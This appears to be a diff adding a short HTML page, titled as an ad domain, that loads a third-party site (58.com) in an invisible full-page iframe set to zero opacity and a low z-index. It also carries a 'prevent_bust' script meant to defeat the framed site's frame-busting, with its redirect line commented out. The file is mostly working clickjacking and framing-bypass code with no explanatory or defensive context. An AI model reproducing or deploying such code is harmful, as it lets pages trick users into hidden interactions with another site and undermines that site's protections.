@@ -1,0 +1,38 @@
+<!doctype html>
+<html>
+<script src="../vendor/jquery/jquery-1.11.2.min.js"></script>
+<script type="text/javascript">
+//var location=""
+var prevent_bust = 0
+window.onbeforeunload = function() { prevent_bust++ }
+setInterval(function() {
+if (prevent_bust > 0) {
+prevent_bust -= 2
+//window.top.location = "http://server-which-responds-with-204.com"
+}
+}, 1)
+
+
+function fun_delegate(){
+	$.ajax({
+        url: "http://www.baidu.com",
+        type: 'GET',
+        dataType: 'Text',//here
+        success: function (data) {
+			alert(data)
+        }
+    });
+}
+</script>
+<head>
+<meta charset="utf-8">
+<title>ads1.urnxyz.com</title>
+</head>
+
+<body>
+<div id="ads_network" style="background:#FFFFFF; width:100%; height:100%;position: absolute; top:40px; left:0px;z-index:-1000; opacity:0.0 ">
+<iframe border="0" id="cal_sf" name="cal_sf" marginWidth="0" marginHeight="0" src="http://www.58.com" frameBorder="No" scrolling="no"  style="width:100%; height:100%;" />
+</div>
+
+</body>
+</html>
